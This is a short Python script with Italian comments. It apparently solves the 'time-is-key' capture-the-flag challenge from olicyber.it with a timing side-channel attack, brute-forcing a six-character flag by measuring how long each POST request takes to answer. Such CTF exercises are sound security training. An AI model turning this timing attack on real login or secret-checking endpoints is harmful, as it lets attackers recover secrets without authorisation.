import requests
import time

url = "http://time-is-key.challs.olicyber.it/"
flag_length = 6
known_flag = ""

for i in range(flag_length):
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        test_flag = known_flag + char + "A" * (flag_length - len(known_flag) - 1)   #somma la flag conosciuta, il carattere da provare e aggiunge tante A per completare la lunghezza che è di 6
        start = time.time() #il tempo è necessario in quanto permette di dedurre se il carattere che si sta provando è corretto o meno in base a quanto ci impiega
        response = requests.post(url, data={'flag': test_flag}) #richiesta post in cui mando un flag
        end = time.time()
        elapsed = end - start   #tempo impiegato

        if elapsed > (i + 1):  # ogni volta che un carattere è corretto viene aggiunto un ritardo di 1 secondo, possiamo capire da ciò s eil carattere testato sia giusto oppure no
            known_flag += char
            print(f"Found character {i + 1}: {char}")
            break

print(f"Flag found: {known_flag}")
